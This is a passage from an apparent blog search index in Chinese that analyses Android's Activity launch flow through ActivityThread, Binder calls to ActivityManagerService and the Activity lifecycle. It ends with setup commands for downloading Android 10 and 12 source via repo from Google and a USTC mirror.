exited\");\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#32","title":"3.2 \u5c0f\u7ed3","text":"<p>zygote \u8fdb\u7a0b\u4f5c\u4e3a Socket \u670d\u52a1\u7aef\u5728\u63a5\u6536\u5230\u4f5c\u4e3a\u5ba2\u6237\u7aef\u7684 AMS \u53d1\u9001\u8fc7\u6765\u7684\u8bf7\u6c42\u548c\u53c2\u6570\u4e4b\u540e\uff0cfock \u51fa\u65b0\u7684\u8fdb\u7a0b\u5e76\u6839\u636e\u5404\u79cd\u53c2\u6570\u8fdb\u7a0b\u4e86\u521d\u59cb\u5316\u7684\u5de5\u4f5c\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u548c zygote \u542f\u52a8 system_server \u8fdb\u7a0b\u7684\u8fc7\u7a0b\u5982\u51fa\u4e00\u8f99\uff0c\u65f6\u5e8f\u56fe\u5982\u4e0b\u6240\u793a\uff1a</p> <p></p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#4-activitythread-activity","title":"4. ActivityThread \u2014\u2014 Activity","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#41","title":"4.1 \u8c03\u7528\u8fc7\u7a0b\u5206\u6790","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#411-activitythreadattach","title":"4.1.1 ActivityThread.attach","text":"<p>\u4e0a\u4e00\u5c0f\u8282\u7684\u6700\u540e\uff0cActivityThread \u7684 main \u901a\u8fc7\u53cd\u5c04\u88ab\u8fd0\u884c\u8d77\u6765\u4e86\uff0c\u63a5\u7740\u4f1a\u8c03\u7528 ActivityThread \u7684 attach \u65b9\u6cd5\uff1a</p> <pre><code>private void attach(boolean system) {\n    ...\n    mSystemThread = system;\n    if (!system) {\n        ...\n        // \u83b7\u53d6 ActivityManagerProxy \u5bf9\u8c61\n        final IActivityManager mgr = ActivityManagerNative.getDefault();\n        try {\n            // \u901a\u8fc7 Binder \u8c03\u7528 AMS \u7684 attachApplication \u65b9\u6cd5\n            mgr.attachApplication(mAppThread);\n        } catch (RemoteException ex) {\n            throw ex.rethrowFromSystemServer();\n        }\n    } else {\n        ...\n    }\n    ...\n}\n</code></pre> <p>\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u4e00\u6b21\u901a\u8fc7 Binder IPC \u673a\u5236\u8ddf AMS \u901a\u4fe1\uff0c\u901a\u4fe1\u6a21\u578b\u8ddf\u524d\u9762 Launcher App \u8c03\u7528 AMS \u7684 startActivity \u65b9\u6cd5\u4e00\u6837\uff0cgetDefault \u8fc7\u7a0b\u4e0d\u91cd\u590d\u5206\u6790\uff0c\u8fd9\u6b21\u662f\u8c03\u7528\u4e86 AMS \u7684 attachApplication \u65b9\u6cd5\uff0c\u6ce8\u610f\u8fd9\u91cc\u5c06 ApplicationThead \u7c7b\u578b\u7684 mAppThread \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u4e86\u8fc7\u53bb\uff0cApplicationThead \u662f ActivityThread \u7684\u4e00\u4e2a\u5185\u90e8\u7c7b\uff0c\u540e\u9762\u6211\u4eec\u4f1a\u8bb2\u5230\uff0c\u5148\u67e5\u770b AMP \u7684 attachApplication \u65b9\u6cd5\uff1a</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#412-activitymanagerproxyattachapplication","title":"4.1.2 ActivityManagerProxy.attachApplication","text":"<pre><code>public void attachApplication(IApplicationThread app) throws RemoteException {\n    ...\n    // \u8c03\u7528 asBinder \u65b9\u6cd5\u4f7f\u5176\u80fd\u591f\u8de8\u8fdb\u7a0b\u4f20\u8f93\n    data.writeStrongBinder(app.asBinder());\n    // \u901a\u8fc7 transact \u65b9\u6cd5\u5c06\u6570\u636e\u4ea4\u7ed9 Binder \u9a71\u52a8\n    mRemote.transact(ATTACH_APPLICATION_TRANSACTION, data, reply, 0); \n    reply.readException();\n    data.recycle();\n    reply.recycle();\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#413-activitymanagernativeontransact","title":"4.1.3 ActivityManagerNative.onTransact","text":"<pre><code>public boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {\n    switch (code) {\n        ...\n        case ATTACH_APPLICATION_TRANSACTION: {\n            data.enforceInterface(IActivityManager.descriptor);\n            // \u83b7\u53d6 ApplicationThread \u7684\u4ee3\u7406\u5bf9\u8c61\uff0c\u8fd9\u91cc\u8fd4\u56de\u7684\u662f ApplicationThreadNative(ATN)\n            // \u7684\u5185\u90e8\u7c7b\uff1aApplicationThreadProxy(ATP) \u5bf9\u8c61\n            IApplicationThread app = ApplicationThreadNative.asInterface(data.readStrongBinder());\n            if (app != null) {\n                // \u59d4\u6258\u7ed9 AMS \u6267\u884c\n                attachApplication(app);\n            }\n            reply.writeNoException();\n            return true;\n        }\n        ...\n    }\n}\n</code></pre> <p>asInterface \u5c06 ActivityThread \u5bf9\u8c61\u8f6c\u6362\u6210\u4e86 ApplicationThreadNative(ATN) \u7684 Binder \u4ee3\u7406\u5bf9\u8c61 ApplicationThreadProxy(ATP)\uff0c\u5e76\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9 attachApplication \u65b9\u6cd5\uff0c\u5176\u4e2d ATP \u662f ATN \u7684\u5185\u90e8\u7c7b\u3002</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#414-activitymanagerserviceattachapplication","title":"4.1.4 ActivityManagerService.attachApplication","text":"<pre><code>public final void attachApplication(IApplicationThread thread) {\n    synchronized (this) {\n        int callingPid = Binder.getCallingPid();\n        final long origId = Binder.clearCallingIdentity();\n        attachApplicationLocked(thread, callingPid);\n        Binder.restoreCallingIdentity(origId);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#415-activitymanagerserviceattachapplicationlocked","title":"4.1.5 ActivityManagerService.attachApplicationLocked","text":"<pre><code>private final boolean attachApplicationLocked(IApplicationThread thread, int pid) {\n    ProcessRecord app;\n    ...\n    try {\n        // \u7ed1\u5b9a\u6b7b\u4ea1\u901a\u77e5\n        AppDeathRecipient adr = new AppDeathRecipient(app, pid, thread);\n        thread.asBinder().linkToDeath(adr, 0);\n        app.deathRecipient = adr;\n    } catch (RemoteException e) {\n        app.resetPackageList(mProcessStats);\n        // \u5982\u679c system_server \u8fdb\u7a0b\u6b7b\u4ea1\u5219\u91cd\u65b0\u542f\u52a8\u8fdb\u7a0b\n        startProcessLocked(app, \"link fail\", processName); \n        return false;\n    }\n    ...\n    try {\n        ...\n        // \u83b7\u53d6\u5e94\u7528appInfo\n        ApplicationInfo appInfo = app.instrumentationInfo != null\n                ? app.instrumentationInfo : app.info;\n        ...\n        // \u7ed1\u5b9a\u5e94\u7528\n        thread.bindApplication(processName, appInfo, providers, app.instrumentationClass,\n                profilerInfo, app.instrumentationArguments, app.instrumentationWatcher,\n                app.instrumentationUiAutomationConnection, testMode, enableOpenGlTrace,\n                isRestrictedBackupMode || !normalMode, app.persistent,\n                new Configuration(mConfiguration), app.compat,\n                getCommonServicesLocked(app.isolated),\n                mCoreSettingsObserver.getCoreSettingsLocked());\n        ...\n    } catch (Exception e) {\n        app.resetPackageList(mProcessStats);\n        app.unlinkDeathRecipient();\n        // bindApplication \u5931\u8d25\u4e5f\u8981\u91cd\u542f\u8fdb\u7a0b\n        startProcessLocked(app, \"bind fail\", processName);\n        return false;\n    }\n    // \u5982\u679c\u662f Activity: \u68c0\u67e5\u6700\u9876\u5c42\u53ef\u89c1\u7684Activity\u662f\u5426\u7b49\u5f85\u5728\u8be5\u8fdb\u7a0b\u4e2d\u8fd0\u884c\n    if (normalMode) {\n        try {\n            if (mStackSupervisor.attachApplicationLocked(app)) {\n                didSomething = true;\n            }\n        } catch (Exception e) {\n            badApp = true;\n        }\n    }\n    // \u5982\u679c\u662f Service: \u5bfb\u627e\u6240\u6709\u9700\u8981\u5728\u8be5\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u7684\u670d\u52a1\n    if (!badApp) {\n        try {\n            didSomething |= mServices.attachApplicationLocked(app, processName);\n        } catch (Exception e) {\n            badApp = true;\n        }\n    }\n\n    // \u5982\u679c\u662f BroadcastReceiver: \u68c0\u67e5\u662f\u5426\u5728\u8fd9\u4e2a\u8fdb\u7a0b\u4e2d\u6709\u4e0b\u4e00\u4e2a\u5e7f\u64ad\u63a5\u6536\u8005\n    if (!badApp &amp;&amp; isPendingBroadcastProcessLocked(pid)) {\n        try {\n            didSomething |= sendPendingBroadcastsLocked(app);\n        } catch (Exception e) {\n            badApp = true;\n        }\n    }\n    // \u68c0\u67e5\u662f\u5426\u5728\u8fd9\u4e2a\u8fdb\u7a0b\u4e2d\u6709\u4e0b\u4e00\u4e2a backup \u4ee3\u7406\n    if (!badApp &amp;&amp; mBackupTarget != null &amp;&amp; mBackupTarget.appInfo.uid == app.uid) {\n        ensurePackageDexOpt(mBackupTarget.appInfo.packageName);\n        try {\n            thread.scheduleCreateBackupAgent(mBackupTarget.appInfo,\n                    compatibilityInfoForPackageLocked(mBackupTarget.appInfo),\n                    mBackupTarget.backupMode);\n        } catch (Exception e) {\n            badApp = true;\n        }\n    }\n    if (badApp) { \n        // \u6740\u6389 badApp\n        app.kill(\"error during init\", true);\n        handleAppDiedLocked(app, false, true);\n        return false;\n    }\n    if (!didSomething) {\n        // \u66f4\u65b0 adj(\u7ec4\u4ef6\u7684\u6743\u503c)\n        updateOomAdjLocked(); \n    }\n    return true;\n}\n</code></pre> <p>\u9996\u5148\uff0c\u901a\u8fc7 ATP \u4f7f\u7528 Binder \u5411 ATN \u53d1\u8d77 bindApplication \u8bf7\u6c42\uff0c\u7136\u540e\u901a\u8fc7 normalMode \u5b57\u6bb5\u5224\u65ad\u662f\u5426\u4e3a Activity\uff0c\u5982\u679c\u662f\u5219\u6267\u884c ActivityStackSupervisor \u7684 attachApplicationLocked \u65b9\u6cd5\u3002</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#4151-activitythreadjavaapplicationthreadbindapplication","title":"4.1.5.1 ActivityThread.java::ApplicationThread.bindApplication","text":"<p>thread \u5bf9\u8c61\u7c7b\u578b\u662f ATP\uff0c\u901a\u8fc7 Binder \u9a71\u52a8\u8c03\u5230\u4e86 ATN \u7684\u65b9\u6cd5\uff0cATN \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5b83\u7684\u5b9e\u73b0\u90fd\u59d4\u6258\u7ed9\u4e86 ApplicationThread(\u8fd9\u8ddf AMS \u8ddf AMN \u7684\u5173\u7cfb\u4e00\u6837)\uff0cApplicationThread \u4f5c\u4e3a ActivityThread \u7684\u5185\u90e8\u7c7b\u5b58\u5728\uff0c\u5b83\u7684 binderApplication \u65b9\u6cd5\u5982\u4e0b\uff1a</p> <p>ActivityThread.java::ApplicationThread\uff1a</p> <pre><code>public final void bindApplication(String processName, ApplicationInfo appInfo,\n    List&lt;ProviderInfo&gt; providers, ComponentName instrumentationName, ProfilerInfo profilerInfo,\n    Bundle instrumentationArgs, IInstrumentationWatcher instrumentationWatcher,\n    IUiAutomationConnection instrumentationUiConnection, int debugMode, boolean\n    enableOpenGlTrace, boolean isRestrictedBackupMode, boolean persistent, Configuration\n    config, CompatibilityInfo compatInfo, Map&lt;String, IBinder&gt; services, Bundle coreSettings) {\n\n    if (services != null) {\n        // \u5c06services\u7f13\u5b58\u8d77\u6765, \u51cf\u5c11binder\u68c0\u7d22\u670d\u52a1\u7684\u6b21\u6570\n        ServiceManager.initServiceCache(services);\n    }\n    ...\n    // \u53d1\u9001\u6d88\u606f H.BIND_APPLICATION \u7ed9 Handler \u5bf9\u8c61\n    sendMessage(H.BIND_APPLICATION, data);\n}\n</code></pre> <p>H \u662f ActivityThread \u4e2d\u7684\u4e00\u4e2a Handler \u5bf9\u8c61\uff0c\u7528\u4e8e\u5904\u7406\u53d1\u9001\u8fc7\u6765\u7684\u5404\u79cd\u6d88\u606f\uff1a</p> <pre><code>private class H extends Handler {\n    public static final int BIND_APPLICATION        = 110;\n\n    public void handleMessage(Message msg) {\n        ...\n        case BIND_APPLICATION:\n            Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"bindApplication\");\n            AppBindData data = (AppBindData)msg.obj;\n            handleBindApplication(data);\n            Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);\n            break;\n        ...\n    }\n}\n</code></pre> <p>\u8c03\u7528\u4e86 handleBindApplication \u65b9\u6cd5\uff1a</p> <pre><code>private void handleBindApplication(AppBindData data) {\n    // \u83b7\u53d6 LoadedApk \u5bf9\u8c61\n    data.info = getPackageInfoNoCheck(data.appInfo, data.compatInfo);\n    ...\n    // \u521b\u5efa ContextImpl \u4e0a\u4e0b\u6587\n    final ContextImpl appContext = ContextImpl.createAppContext(this, data.info);\n    ...\n    // \u521b\u5efa Instrumentation \u5bf9\u8c61\n    if (data.instrumentationName != null) {\n        ...\n    } else {\n        mInstrumentation = new Instrumentation();\n    }\n\n    try {\n        // \u8c03\u7528 LoadedApk \u7684 makeApplication \u65b9\u6cd5\u521b\u5efa Application\n        Application app = data.info.makeApplication(data.restrictedBackupMode, null);\n        mInitialApplication = app;\n        ...\n        mInstrumentation.onCreate(data.instrumentationArgs);\n        // \u8c03\u7528 Application.onCreate \u65b9\u6cd5\n        mInstrumentation.callApplicationOnCreate(app);\n    } finally {\n        StrictMode.setThreadPolicy(savedPolicy);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#4152-activitystacksupervisorattachapplicationlocked","title":"4.1.5.2 ActivityStackSupervisor.attachApplicationLocked","text":"<p>\u5728 4.1.4 \u5c0f\u8282\u4e2d\u901a\u8fc7 Binder \u5411 ActivityThread \u53d1\u8d77 bindApplication \u8bf7\u6c42\u540e\uff0c\u4f1a\u6839\u636e\u542f\u52a8\u7ec4\u4ef6\u7684\u7c7b\u578b\u53bb\u505a\u76f8\u5e94\u7684\u5904\u7406\uff0c\u5982\u679c\u662f Acitivity\uff0c\u5219\u4f1a\u8c03\u7528 ActivityStackSupervisor \u7684 attachApplicationLocked \u65b9\u6cd5\uff1a</p> <pre><code>boolean attachApplicationLocked(ProcessRecord app) throws RemoteException {\n    final String processName = app.processName;\n    boolean didSomething = false;\n    for (int displayNdx = mActivityDisplays.size() - 1; displayNdx &gt;= 0; --displayNdx) {\n        ArrayList&lt;ActivityStack&gt; stacks = mActivityDisplays.valueAt(displayNdx).mStacks;\n        for (int stackNdx = stacks.size() - 1; stackNdx &gt;= 0; --stackNdx) {\n            final ActivityStack stack = stacks.get(stackNdx);\n            if (!isFrontStack(stack)) {\n                continue;\n            }\n            // \u83b7\u53d6\u524d\u53f0stack\u4e2d\u6808\u9876\u7b2c\u4e00\u4e2a\u975e finishing \u72b6\u6001\u7684 Activity\n            ActivityRecord hr = stack.topRunningActivityLocked(null);\n            if (hr != null) {\n                if (hr.app == null &amp;&amp; app.uid == hr.info.applicationInfo.uid &amp;&amp; processName.equals(hr.processName)) {\n                    try {\n                        // \u771f\u6b63\u7684\u542f\u52a8 Activity\n                        if (realStartActivityLocked(hr, app, true, true)) {\n                            didSomething = true;\n                        }\n                    } catch (RemoteException e) {\n                        throw e;\n                    }\n                }\n            }\n        }\n    }\n    ...\n    return didSomething;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#41521-activitystacksupervisorrealstartactivitylocked","title":"4.1.5.2.1 ActivityStackSupervisor.realStartActivityLocked","text":"<p>\u524d\u9762 2.1.8 ActivityStackSupervisor.startSpecificActivityLocked \u5c0f\u8282\u4e2d\u5206\u6790\u8fc7\uff0c\u5982\u679c\u5f53\u524d Activity \u4f9d\u9644\u7684 Application \u5df2\u7ecf\u88ab\u542f\u52a8\uff0c\u5219\u8c03\u7528 realStartActivityLocked \u65b9\u6cd5\uff0c\u5426\u5219\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\uff0c\u518d\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u4e4b\u540e\uff0c\u4e24\u4e2a\u6d41\u7a0b\u7684\u5728\u8fd9\u91cc\u5408\u5e76\u8d77\u6765\u4e86\uff1a</p> <pre><code>final boolean realStartActivityLocked(ActivityRecord r, ProcessRecord app, boolean andResume, boolean checkConfig) throws RemoteException {\n    ...\n    final ActivityStack stack = task.stack;\n    try {\n        ...\n        app.forceProcessStateUpTo(mService.mTopProcessState);\n        // \u901a\u8fc7 Binder \u8c03\u7528 ApplicationThread \u7684 scheduleLaunchActivity \u65b9\u6cd5\n        app.thread.scheduleLaunchActivity(new Intent(r.intent), r.appToken,\n                System.identityHashCode(r), r.info, new Configuration(mService.mConfiguration),\n                new Configuration(stack.mOverrideConfig), r.compat, r.launchedFromPackage,\n                task.voiceInteractor, app.repProcState, r.icicle, r.persistentState, results,\n                newIntents, !andResume, mService.isNextTransitionForward(), profilerInfo);\n        ...\n    } catch (RemoteException e) {\n        if (r.launchFailed) {\n            // \u7b2c\u4e8c\u6b21\u542f\u52a8\u5931\u8d25\uff0c\u5219\u7ed3\u675f\u8be5 Activity\n            mService.appDiedLocked(app);\n            stack.requestFinishActivityLocked(r.appToken, Activity.RESULT_CANCELED, null,\n                    \"2nd-crash\", false);\n            return false;\n        }\n        // \u7b2c\u4e00\u4e2a\u542f\u52a8\u5931\u8d25\uff0c\u5219\u91cd\u542f\u8fdb\u7a0b\n        app.activities.remove(r);\n        throw e;\n    }\n    ...\n    return true;\n}\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u6b21\u4f7f\u7528 Binder \u8c03\u7528 ApplicationThread \u7684 scheduleLaunchActivity \u65b9\u6cd5\u3002</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#41522-applicationthreadschedulelaunchactivity","title":"4.1.5.2.2 ApplicationThread.scheduleLaunchActivity","text":"<pre><code>public final void scheduleLaunchActivity(Intent intent, IBinder token, int ident, ActivityInfo \n        info, Configuration curConfig, Configuration overrideConfig, CompatibilityInfo \n        compatInfo, String referrer, IVoiceInteractor voiceInteractor, int procState, Bundle \n        state, PersistableBundle persistentState, List&lt;ResultInfo&gt; pendingResults, \n        List&lt;ReferrerIntent&gt; pendingNewIntents, boolean notResumed, boolean isForward, \n        ProfilerInfo profilerInfo) {\n    ...\n    updateProcessState(procState, false);\n    ActivityClientRecord r = new ActivityClientRecord();\n    ...\n    sendMessage(H.LAUNCH_ACTIVITY, r);\n }\n</code></pre> <p>\u4e0a\u9762\u63d0\u5230\u8fc7\uff0cH \u662f ActivityThread \u4e2d\u4e00\u4e2a Handler \u7c7b\uff0c\u5b83\u63a5\u6536\u5230 LAUNCH_ACTIVITY \u6d88\u606f\u540e\u4f1a\u8c03\u7528 handleLaunchActivity \u65b9\u6cd5\u3002</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#41523-activitythreadhandlelaunchactivity","title":"4.1.5.2.3 ActivityThread.handleLaunchActivity","text":"<pre><code>private void handleLaunchActivity(ActivityClientRecord r, Intent customIntent) {\n    ...\n    // \u521d\u59cb\u5316 WMS\n    WindowManagerGlobal.initialize();\n    // \u6267\u884c performLaunchActivity \u65b9\u6cd5\n    Activity a = performLaunchActivity(r, customIntent);\n    if (a != null) {\n        r.createdConfig = new Configuration(mConfiguration);\n        Bundle oldState = r.state;\n        // \u6267\u884c handleResumeActivity \u65b9\u6cd5\uff0c\u6700\u7ec8\u8c03\u7528 onStart \u548c onResume \u65b9\u6cd5\n        handleResumeActivity(r.token, false, r.isForward,\n                !r.activity.mFinished &amp;&amp; !r.startsNotResumed);\n\n        if (!r.activity.mFinished &amp;&amp; r.startsNotResumed) {\n            r.activity.mCalled = false;\n            mInstrumentation.callActivityOnPause(r.activity);\n            r.paused = true;\n        }\n    } else {\n        // \u505c\u6b62\u8be5 Activity\n        ActivityManagerNative.getDefault()\n            .finishActivity(r.token, Activity.RESULT_CANCELED, null, false);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#41424-applicationthreadperformlaunchactivity","title":"4.1.4.2.4 ApplicationThread.performLaunchActivity","text":"<pre><code>private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent) {\n    ...\n    Activity activity = null;\n    try {\n        java.lang.ClassLoader cl = r.packageInfo.getClassLoader();\n        // Instrumentation \u4e2d\u4f7f\u7528\u53cd\u5c04\u521b\u5efa Activity\n        activity = mInstrumentation.newActivity(cl, component.getClassName(), r.intent);\n        ...\n    } catch (Exception e) {\n        ...\n    }\n\n    try {\n        // \u521b\u5efa Application \u5bf9\u8c61\u5e76\u8c03\u7528 Application \u7684 onCreate \u65b9\u6cd5\n        Application app = r.packageInfo.makeApplication(false, mInstrumentation);\n\n        if (activity != null) {\n            ...\n            // attach \u5230 Window \u4e0a\n            activity.attach(appContext, this, getInstrumentation(), r.token,\n                    r.ident, app, r.intent, r.activityInfo, title, r.parent,\n                    r.embeddedID, r.lastNonConfigurationInstances, config,\n                    r.referrer, r.voiceInteractor);\n\n            if (customIntent != null) {\n                activity.mIntent = customIntent;\n            }\n            r.lastNonConfigurationInstances = null;\n            activity.mStartedActivity = false;\n            int theme = r.activityInfo.getThemeResource();\n            if (theme != 0) {\n                // \u8bbe\u7f6e\u4e3b\u9898\n                activity.setTheme(theme);\n            }\n\n            activity.mCalled = false;\n            if (r.isPersistable()) {\n                // \u91cd\u65b0\u521b\u5efa\u7684 Activity\n                mInstrumentation.callActivityOnCreate(activity, r.state, r.persistentState);\n            } else {\n                // \u7b2c\u4e00\u6b21\u521b\u5efa\u7684 Activity\n                mInstrumentation.callActivityOnCreate(activity, r.state);\n            }\n            ...\n        }\n        ...\n    }  catch (Exception e) {\n        ...\n    }\n    return activity;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#41525-instrumentationcallactivityoncreate","title":"4.1.5.2.5 Instrumentation.callActivityOnCreate","text":"<pre><code>public void callActivityOnCreate(Activity activity, Bundle icicle,\n            PersistableBundle persistentState) {\n    prePerformCreate(activity);\n    // \u8c03\u7528 Activity \u7684 performCreate \u65b9\u6cd5\n    activity.performCreate(icicle, persistentState);\n    postPerformCreate(activity);\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#41526-activityperformcreate","title":"4.1.5.2.6 Activity.performCreate","text":"<pre><code>final void performCreate(Bundle icicle, PersistableBundle persistentState) {\n        restoreHasCurrentPermissionRequest(icicle);\n    onCreate(icicle, persistentState);\n    mActivityTransitionState.readState(icicle);\n    performCreateCommon();\n}\n</code></pre> <p>\u7ec8\u4e8e\uff0conCreate \u65b9\u6cd5\u88ab\u8c03\u7528\u4e86\uff01\uff01\uff01</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#42","title":"4.2 \u5c0f\u7ed3","text":"<p>\u4ece ActivityThread \u5230\u6700\u7ec8 Activity \u88ab\u521b\u5efa\u53ca\u751f\u547d\u5468\u671f\u88ab\u8c03\u7528\uff0c\u6838\u5fc3\u8fc7\u7a0b\u6d89\u53ca\u5230\u4e86\u4e09\u6b21 Binder IPC \u8fc7\u7a0b\uff0c\u5206\u522b\u662f\uff1aActivityThread \u8c03\u7528 AMS \u7684 attachApplication \u65b9\u6cd5\u3001AMS \u8c03\u7528 ApplicationThread \u7684 bindApplication \u65b9\u6cd5\u3001ASS \u8c03\u7528 Application \u7684 attachApplicationLocked \u65b9\u6cd5\uff0c\u6574\u4e2a\u8fc7\u7a0b\u7684\u65f6\u5e8f\u56fe\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#5","title":"5. \u603b\u7ed3","text":"<p>\u7eb5\u89c2\u6574\u4e2a\u8fc7\u7a0b\uff0c\u4ece Launcher \u5230 AMS\u3001\u4ece AMS \u518d\u5230 Zygote\u3001\u518d\u4ece Zygote \u5230 ActivityThread\uff0c\u6700\u540e\u5728 ActivitThread \u4e2d\u5c42\u5c42\u8c03\u7528\u5230 Activity \u7684\u751f\u547d\u5468\u671f\u65b9\u6cd5\uff0c\u4e2d\u95f4\u6d89\u53ca\u5230\u4e86\u65e0\u6570\u7684\u7ec6\u8282\uff0c\u4f46\u603b\u4f53\u4e0a\u8109\u7edc\u8fd8\u662f\u975e\u5e38\u6e05\u6670\u7684\uff0c\u5404\u4e2a Android \u7248\u672c\u7684 Framework \u5c42\u4ee3\u7801\u53ef\u4ee5\u67d0\u4e9b\u8fc7\u7a0b\u7684\u5b9e\u73b0\u4e0d\u592a\u4e00\u6837\uff0c\u4f46\u662f\u6574\u4e2a\u8c03\u7528\u6d41\u7a0b\u5927\u4f53\u4e0a\u4e5f\u662f\u76f8\u540c\u7684\uff0c\u501f\u7528 Gityuan \u5927\u795e\u7684\u4e00\u5f20\u56fe\u4f5c\u4e3a\u7ed3\u5c3e\uff1a</p> <p></p> <p>\u7cfb\u5217\u6587\u7ae0</p> <p>\u53c2\u8003\u6587\u7ae0</p> <p>startActivity\u542f\u52a8\u8fc7\u7a0b\u5206\u6790 - Gityuan\u535a\u5ba2 | \u8881\u8f89\u8f89\u7684\u6280\u672f\u535a\u5ba2</p>"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/","title":"Android10\u6e90\u7801\u4e0b\u8f7d","text":""},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#_1","title":"\u4e00\u3001\u73af\u5883\u914d\u7f6e","text":""},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#google-httpssourceandroidcomsetupbuilddownloading","title":"Google\u5b98\u65b9\u6587\u6863\uff1a https://source.android.com/setup/build/downloading","text":"<p>\u5b89\u88c5Repo\uff1a </p> <pre><code>mkdir ~/bin \nPATH=~/bin:$PATH\ncurl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo\nchmod a+x ~/bin/repo\n</code></pre> <p>\u521d\u59cb\u5316repo\uff1a </p> <pre><code>mkdir WORKING_DIRECTORY \ncd WORKING_DIRECTORY\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"you@example.com\"\n</code></pre> <p>\u4ece\u8fd9\u4e2a\u94fe\u63a5 https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds \u83b7\u53d6\u4e00\u4e2a\u5206\u652f\u5730\u5740\uff0c\u4f7f\u7528<code>repo init</code>\u8fdb\u884c\u521d\u59cb\u5316\u3002\u5f53\u524d\u6700\u65b0\u7684tag\u5206\u652f\u4e3a<code>android-10.0.0_r20</code>\uff0c\u5982\u4e0b\u56fe\u3002\u6211\u4eec\u4e0b\u8f7d\u6b64\u5206\u652f: </p> <p></p> <p>\u540c\u6b65android-10.0.0_r20\u4ee3\u7801\uff1a</p> <pre><code>repo init --depth 1 -u https://android.googlesource.com/platform/manifest -b android-10.0.0_r20\nrepo sync -c -j4\n</code></pre>"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#httpsmirrorsustceducnhelpaosphtml","title":"\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf : https://mirrors.ustc.edu.cn/help/aosp.html","text":"<p>\u5728~/.bashrc\u4e2d\u914d\u7f6erepo</p> <pre><code>export REPO_URL='https://gerrit-googlesource.proxy.ustclug.org/git-repo'\n</code></pre> <p>\u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a</p> <pre><code>mkdir android10-security-release &amp;&amp; cd android10-security-release\nrepo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-security-10.0.0_r66\nrepo sync -c -j4\n</code></pre> <p>\u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a</p> <pre><code>mkdir android-12.1.0 &amp;&amp; cd android-12.1.0\nrepo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-12.1.0_r5\nrepo sync -c -j4\n</code></pre> <p>\u538b\u7f29\u5206\u4eab\uff1a</p> <pre><code>tar --exclude=\".*\" --exclude=\"out\" -cvf android10-security-release.tar.gz android10-security-release\ntar --exclude=\".*\" --exclude=\"out\" -cvf android-12.1.0.tar.gz 